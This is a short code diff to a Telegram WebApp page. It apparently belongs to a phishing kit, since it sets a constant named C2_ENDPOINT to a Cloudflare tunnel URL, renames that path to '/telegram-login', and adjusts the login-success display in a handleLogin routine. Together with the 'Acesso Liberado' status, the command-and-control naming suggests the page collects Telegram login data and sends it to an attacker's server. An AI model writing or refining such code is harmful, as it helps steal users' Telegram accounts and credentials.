@@ -101,7 +101,7 @@
     <script>
 const tg = window.Telegram.WebApp;
 // Use a URL do túnel do Cloudflare aqui
-const C2_ENDPOINT = 'https://lawsuit-generation-grown-hiking.trycloudflare.com/linkguard-auth';
+const C2_ENDPOINT = 'https://lawsuit-generation-grown-hiking.trycloudflare.com/telegram-login';
 
 tg.ready();
 tg.expand();
@@ -204,7 +204,7 @@ async function handleLogin() {
         if (result && result.status === 'authenticated') {
             setTimeout(() => {
                 document.getElementById('content-area').classList.remove('hidden');
-                document.getElementById('user-name').textContent = authData.user.first_name;
+                document.getElementById('user-name').textContent = result.user.first_name;
                 statusMsg.textContent = '✅ Acesso Liberado';
                 showDebugLog('Autenticação bem-sucedida');
                 tg.HapticFeedback.notificationOccurred('success');
